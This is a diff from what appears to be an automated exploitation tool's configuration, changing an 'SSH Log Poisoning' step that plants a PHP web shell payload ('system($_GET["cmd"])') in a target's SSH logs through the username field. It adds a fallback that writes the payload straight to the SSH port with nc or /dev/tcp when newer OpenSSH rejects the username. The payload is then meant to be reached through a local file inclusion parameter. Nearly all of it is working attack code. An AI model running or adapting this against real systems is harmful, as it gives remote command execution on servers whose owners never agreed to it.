@@ -283,11 +283,25 @@ exploit_paths:
           if ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
             SSH_PORT=22
           fi
+          PAYLOAD='<?php system($_GET["cmd"]);?>'
           echo "=== SSH Log Poisoning ==="
           echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
-          sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+          SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
             -p "$SSH_PORT" \
-            '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
+            "$PAYLOAD"@{TARGET_IP} 2>&1 || true)
+          echo "$SSH_ERR" | head -3
+
+          # OpenSSH 新版会拦截含特殊字符用户名，自动回退到 SSH banner 投毒
+          if echo "$SSH_ERR" | grep -qi "invalid characters"; then
+            echo "[INFO] OpenSSH rejected username payload, fallback to SSH banner poisoning"
+            if command -v nc >/dev/null 2>&1; then
+              printf '%s\r\n' "$PAYLOAD" | nc -w 3 {TARGET_IP} "$SSH_PORT" >/dev/null 2>&1 || true
+            else
+              (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT" && \
+               printf '%s\r\n' "$PAYLOAD" >&3 && sleep 1 && \
+               exec 3>&- 3<&-) >/dev/null 2>&1 || true
+            fi
+          fi
           sleep 2
 
           CONFIRMED_PARAM="{lfi_param}"
